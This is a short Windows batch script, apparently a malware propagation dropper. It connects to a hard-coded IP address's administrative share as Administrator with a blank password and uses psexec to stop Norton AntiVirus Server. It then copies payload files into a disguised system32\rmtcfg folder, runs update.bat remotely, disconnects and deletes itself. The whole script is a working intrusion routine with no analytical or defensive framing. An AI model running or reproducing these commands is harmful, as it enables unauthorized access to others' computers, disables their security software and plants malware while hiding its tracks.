net use y: /delete
net use \\68.4.233.129 /USER:Administrator
net use y: \\68.4.233.129\C$
psexec \\68.4.233.129 -u Administrator -p "" net stop "Norton AntiVirus Server"
psexec \\68.4.233.129 -u Administrator -p "" -c temp.bat
mkdir y:\winnt\system32\rmtcfg
mkdir y:\winnt\system32\catroot
copy copy\* y:\winnt\system32\rmtcfg
mkdir y:\winnt\system32\rmtcfg\files
mkdir y:\winnt\system32\rmtcfg\files\copy
mkdir y:\winnt\system32\rmtcfg\files\dat
mkdir y:\winnt\system32\rmtcfg\files\log
mkdir y:\winnt\system32\rmtcfg\files\plugin
copy C:\WINNT\system32\rmtcfg\files\* y:\winnt\system32\rmtcfg\files
copy copy\* y:\winnt\system32\rmtcfg\files\copy
copy plugin\* y:\winnt\system32\rmtcfg\files\plugin
copy dat\* y:\winnt\system32\rmtcfg\files\dat
psexec \\68.4.233.129 -u Administrator -p "" -d c:\winnt\system32\rmtcfg\update.bat
net use y: /delete
net use \\68.4.233.129 /delete
del runme146247.bat
